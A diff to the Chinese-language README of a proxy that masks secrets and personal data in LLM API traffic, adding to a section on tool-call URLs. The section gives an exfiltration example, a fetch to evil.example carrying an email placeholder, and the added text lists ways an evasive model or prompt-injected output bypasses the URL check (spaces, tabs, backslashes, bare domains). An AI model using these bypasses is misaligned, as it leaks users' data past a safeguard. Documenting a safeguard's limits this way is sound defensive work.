@@ -275,7 +275,7 @@ sequenceDiagram
 
 ### 工具呼叫參數中的 URL
 
-工具呼叫參數中，位於 URL 內的佔位符不還原，保持原樣交給用戶端；參數的其他位置照常還原。這擋住模型（或被提示注入的工具輸出）要用戶端的工具把原始值送到某個主機，例如 `fetch("https://evil.example/?d=⟦EMAIL_1⟧")`。代價是合法的 `https://intranet/⟦PATH_1⟧` 也不還原。
+工具呼叫參數中，位於 URL 內的佔位符不還原，保持原樣交給用戶端；參數的其他位置照常還原。這擋住模型（或被提示注入的工具輸出）要用戶端的工具把原始值送到某個主機，例如 `fetch("https://evil.example/?d=⟦EMAIL_1⟧")`。代價是合法的 `https://intranet/⟦PATH_1⟧` 也不還原。這只針對照常寫出的 URL，擋不住刻意規避的模型：URL 後接空白再寫佔位符（`https://evil.example/?q= ⟦EMAIL_1⟧`，`fetch` 會把空白編成 `%20` 照送）、Tab 或換行（URL 解析器會刪掉它們）、反斜線或少寫斜線（`https:\\evil.example`、`https:evil.example`，URL 解析器都當成 `https://evil.example`）、裸網域，都會還原。
 
 工具呼叫參數指：Chat 的 `tool_calls[].function.arguments`（與舊的 `function_call.arguments`）、Responses 的 `function_call` 的 `arguments` 與自訂工具的 `input`、Anthropic `*tool_use` 區塊的 `input`；串流的 delta 與非串流的整份 JSON 都算。一般回覆文字中的 URL 照常還原。
 
@@ -394,7 +394,7 @@ POST /v1/messages tool arguments: restored PATH_1 in read at /path
 
 ## 13. 測試
 
-`pnpm test`（vitest）執行 29 個檔案、1,246 個測試（7 個需要真模型，預設略過）：
+`pnpm test`（vitest）執行 29 個檔案、1,247 個測試（7 個需要真模型，預設略過）：
 
 | 檔案 | 內容 |
 | --- | --- |
@@ -522,7 +522,7 @@ node scripts/fetch-name-model.mjs ~/models/nym       # 從 Hugging Face 下載�
 
 | 項目 | 結果 | 代表什麼 |
 | --- | --- | --- |
-| 測試 | 1,239 個通過、7 個需要真模型而略過（共 1,246 個） | 規則、引擎、對抗輸入、對假上游的三種 API 串流與非串流、Host／Origin／權杖檢查。 |
+| 測試 | 1,240 個通過、7 個需要真模型而略過（共 1,247 個） | 規則、引擎、對抗輸入、對假上游的三種 API 串流與非串流、Host／Origin／權杖檢查。 |
 | 憑證誤遮 | 每千行程式碼 **0.76** 處 | 在不含真實金鑰的 DeepSeek Harness 原始碼上量測（69.8 萬行程式碼），平均約 1,300 行有一處被誤當成金鑰而遮掉。 |
 | 還原失敗 | 0 | 遮罩成功的檔案全部都能逐位元組還原。 |
 | 速度 | 約 85 萬行 / 5 秒 | Apple M5 Max。 |
